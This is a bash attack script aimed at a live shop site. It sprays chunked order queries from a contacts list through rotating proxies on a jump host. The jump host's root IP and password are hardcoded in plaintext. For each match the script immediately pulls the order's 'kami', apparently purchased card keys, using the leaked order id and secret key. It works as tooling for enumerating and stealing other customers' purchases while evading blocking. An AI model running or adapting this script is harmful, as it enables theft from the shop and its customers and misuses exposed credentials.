#!/bin/bash
# Big exact-match query spray (chunked, proxy refresh) — success-case qd93/xihong style but exact
set -u
export PATH="/data/venvs/pentest/bin:/data/automation/bin:/usr/bin:$PATH"
OUT=/data/automation/results/xuxin66.top/query_big_$(date +%Y%m%d_%H%M%S)
mkdir -p "$OUT"
LOG=/data/logs/xuxin66-query-big.log
exec > >(tee "$LOG") 2>&1
JP=124.248.67.170; JP_PASS=UzHlZQDUy7XP
CONTACTS=/data/tmp/xuxin66_contacts_big.txt
CHUNK=30
echo OUT=$OUT contacts=$(wc -l <$CONTACTS)

qg(){ /data/automation/bin/qg-proxy-fetch.sh >/dev/null; sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no root@$JP "mkdir -p /data/config /data/tmp; cat > /data/config/proxy.env" < /data/config/proxy.env; }
jp(){ sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 root@$JP "$@"; }

sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no /data/automation/bin/xuxin66_query_spray.sh "$CONTACTS" root@$JP:/data/tmp/
jp "chmod +x /data/tmp/xuxin66_query_spray.sh; mv /data/tmp/xuxin66_contacts_big.txt /data/tmp/xuxin66_contacts_big.txt 2>/dev/null; true"
sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no "$CONTACTS" root@$JP:/data/tmp/xuxin66_contacts_big.txt

total=$(wc -l <"$CONTACTS")
for start in $(seq 1 $CHUNK $total); do
  end=$((start+CHUNK-1))
  qg
  echo "[$(date +%H:%M:%S)] chunk $start-$end"
  sed -n "${start},${end}p" "$CONTACTS" > /tmp/xux_chunk.txt
  sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no /tmp/xux_chunk.txt root@$JP:/data/tmp/xux_chunk.txt
  warm=$(jp 'source /data/config/proxy.env; UA=Mozilla/5.0; BASE=https://xuxin66.top/shop; CK=/tmp/qb_ck.txt; rm -f $CK
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 20 -A "$UA" "$BASE/" -o /tmp/w.html -w "WARM=%{http_code}:%{size_download}\n"
r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" -e "$BASE/" -H "X-Requested-With: XMLHttpRequest" -X POST --data-urlencode "id=1" --data-urlencode "skey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" "$BASE/ajax.php?act=order")
echo SANITY=$r')
  echo "$warm"
  echo "$warm" | grep -q '验证失败' || { echo skip_bad_proxy; continue; }
  out=$(jp "bash /data/tmp/xuxin66_query_spray.sh /data/tmp/xux_chunk.txt" 2>/dev/null || true)
  echo "$out" | tee -a "$OUT/query.txt" | grep -E 'HTMLHIT|AJAXHIT|QUERY_DONE|SANITY|HOME' || true
  if echo "$out" | grep -qE 'HTMLHIT|AJAXHIT|showOrder'; then
    echo "$out" | grep -E 'HTMLHIT|AJAXHIT|showOrder' | tee -a "$OUT/hits.txt"
    # fetch kami immediately
    echo "$out" | grep -oE "showOrder\([0-9]+[[:space:]]*,[[:space:]]*'[0-9a-fA-F]+'\)" | sort -u | while read -r so; do
      oid=$(echo "$so" | grep -oE '[0-9]+' | head -1)
      sk=$(echo "$so" | grep -oE '[0-9a-fA-F]{32}')
      jp "source /data/config/proxy.env; UA=Mozilla/5.0; BASE=https://xuxin66.top/shop; CK=/tmp/qb_ck.txt
r=\$(curl -sk -x \"\$PROXY_URL\" -b \$CK -c \$CK --max-time 10 -A \"\$UA\" -e \"\$BASE/?mod=query\" -H 'X-Requested-With: XMLHttpRequest' -X POST --data-urlencode \"id=$oid\" --data-urlencode \"skey=$sk\" \"\$BASE/ajax.php?act=order\")
echo KAMI|$oid|$sk|\$r" | tee -a "$OUT/kami.txt"
    done
  fi
done
echo DONE
wc -l "$OUT/hits.txt" 2>/dev/null || echo hits=0
